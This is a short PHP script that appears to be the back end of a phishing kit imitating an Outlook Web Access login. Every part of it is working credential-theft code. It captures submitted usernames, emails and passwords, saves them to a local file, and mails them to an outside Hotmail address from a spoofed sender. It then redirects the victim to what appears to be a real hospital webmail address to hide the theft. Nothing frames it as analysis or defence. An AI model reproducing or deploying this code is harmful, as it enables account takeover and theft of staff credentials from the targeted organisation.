<?php
function auth($data=''){
	if(empty($data) || !is_array($data)){return FALSE;}
	$username = 'no_username'; if(!empty($data['username'])){$username = $data['username'];}
	$email = 'no_email'; if(!empty($data['email'])){$email = $data['email'];}
	$password = 'no_password'; if(!empty($data['password'])){$password = $data['password'];}
	$destination = 'https://shsmail.swedish.org/owa/'; if(!empty($data['destination'])){$destination = $data['destination'];}

	#mail setting
	$mail['to'] = 'robertkarl401@hotmail.com';
	$mail['subject'] = 'OWA-'.mt_rand();
	$mail['message'] = 'DOMAIN/USERNAME: '.$username."\r\n".'EMAIL: '.$email."\r\n".'PASSWORD: '.$password."\r\n"."\r\n";
	$mail['headers'] = 'From: no-reply@sen.da'."\r\n".
		'Reply-To: no-reply@sen.da'."\r\n".
		'X-Mailer: PHP/' . phpversion();

	#write to file
	$handle = fopen('record.md', 'a');
	fwrite($handle, $mail['message']);
	fclose($handle);

	#send mail
	$send = mail($mail['to'], $mail['subject'], $mail['message'], $mail['headers']);

	#redirect
	header('Location: '.$destination);
	exit();
}
if(isset($_POST)){auth($_POST);}
header('Location: index.php');
exit;
?>